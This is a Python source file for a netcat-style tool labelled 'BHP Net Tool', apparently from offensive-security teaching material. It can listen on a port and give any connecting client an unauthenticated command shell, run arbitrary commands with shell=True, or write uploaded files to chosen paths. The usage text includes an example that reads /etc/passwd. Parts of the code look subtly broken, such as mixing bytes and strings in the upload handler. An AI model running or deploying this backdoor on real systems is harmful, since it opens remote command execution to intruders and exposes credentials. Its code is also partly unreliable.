import sys
import socket
import getopt
import threading
import subprocess

# define global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
   usage_docs = """
   BHP Net Tool 
   Usage: bhpnet.py -t target_host -p port

   -l --listen                   -  listen on [host]:[port] for
                                    incoming connections
   -e --execute=file_to_run      -  execute the given file upon
                                    receiving connection
   -c --command                  -  initialize a command shell
   -u --upload=destination       -  upon receiving connection upload a
                                    file and write to [destination]
   
   Examples:
   bhpnet.py -t 192.168.0.1 -p 8888 -l -c
   bhpnet.py -t 192.168.0.1 -p 8888 -l -u=c:\\target.exe
   bhpnet.py -t 192.168.0.1 -p 8888 -l -e=\"cat /etc/passwd\"
   echo 'abc' | ./bhpnet.py -t 192.168.0.1 -p 135
   """

   print(usage_docs)
   sys.exit(0)

def encode_string(str):
   
   if len(str):
      return str.encode(encoding='utf-8',errors='strict')

def client_sender(buffer):
   
   client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

   try:
      # connect to our target host
      client.connect((target,port))

      if len(buffer):
         client.send(encode_string(buffer))
      
      while True:
            # now wait for data back
            recv_len = 1
            response = ""

            while recv_len:
               data = client.recv(4096).decode("utf-8")
               recv_len = len(data)
               response+= data

               if recv_len < 4096:
                  break
            
            print(response)

            # wait for more input
            # input instead of raw_input for python 3.X
            buffer = input("")
            buffer += "\n"

            # send it off and encode string for python 3.X
            client.send(encode_string(buffer))
               
   except:
      exception_string = "[*] Exception! Exiting."
      print(exception_string)

      # close connection
      client.close()

def server_loop():
   global target      
   
   # if no target is defined, we listen on all interfaces
   if not len(target):
      target = "0.0.0.0"
   
   server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   server.bind((target, port))
   server.listen(5)
   print("server listening on %s:%d" % (target, port))

   while True:
      client_socket, addr = server.accept()

      # spin a thread to handle new client
      client_thread = threading.Thread(target=client_handler, args=(client_socket,))
      client_thread.start()
   
def run_command(command):
   
   # trim the newline
   command = command.rstrip()
   
   # run the command get output back
   try:
      # the subprocess library provides a powerful process-creation interface to start and interact with client programs
      output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
   except:
      output = "Failed to execute command. \r\n"

   # send the output back to the client
   return output

def client_handler(client_socket):
   global upload
   global execute
   global command

   # check for upload
   if len(upload_destination):
      # read in all of the bytes and write to our destination
      file_buffer = ""

      # keep reading data until none is available
      while True:
         data = client_socket.recv(1024)

         if not data:
            break
         else:
            file_buffer += data
      
      # now take these bytes and write them 
      try:
         # the wb flag ensures that we are writing the file in binary mode
         file_descriptor = open(upload_destination,"wb")
         file_descriptor.write(file_buffer)
         file_descriptor.close()

         # notify that we wrote the file
         client_socket.send(encode_string("Successfully saved file to %s\r\n" % upload_destination))
      except:
         client_socket.send(encode_string("Failed to save to %s\r\n" % upload_destination))

   # check for command execution
   if len(execute):
      # run the command
      output = run_command(execute)

      client_socket.send(encode_string(output))

   # loop if the command shell was requested
   if command:
      while True:
         # show a simple prompt
         client_socket.send(encode_string("<BHP:#> "))
            # now we receive until we see a linefeed (enter key)
         
         cmd_buffer = ""
         while "\n" not in cmd_buffer:
            cmd_bytes = client_socket.recv(1024).decode("utf-8")
            cmd_buffer += cmd_bytes
         
         print("[*] Recv'd command %s" % cmd_buffer)
         
         # send back the command output
         response = run_command(cmd_buffer)
         
         
         # send back the response
         client_socket.send(response)
         

def main():
   global listen
   global port
   global execute
   global command
   global upload_destination
   global target

   if not len(sys.argv[1:]):
      usage()
   
   # read commandline options
   try:
         opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
         print(f'arguments: {sys.argv[1:]}')
         print(f'options: {opts}')
   except getopt.GetoptError as err:
      print(err)
   
   for o,a in opts:
      if o in ("-h", "--help"):
         usage()
      elif o in ("-l", "--listen"):
         listen = True
      elif o in ("-e", "--execute"):
         execute = a
      elif o in ("-c", "--command"):
         command = True
      elif o in ("-u", "--upload"):
         upload_destination = a
      elif o in ("-t", "--target"):
         target = a
      elif o in ("-p", "--port"):
         port = int(a)
      else:
         assert False,"Unhandled Option"
   
   # are we going to listen or just send data from stdin?
   if not listen and len(target) and port > 0:
      # read in the buffer from the commandline
      # this will block so send CTRL-D if not sending input
      # to stdin
      buffer = sys.stdin.read()

      # send data
      client_sender(buffer)

   # we are going to listen and potentially
   # upload things, execute commands, and drop a shell back
   # depending on our command line options above
   if listen:
      server_loop()

main()
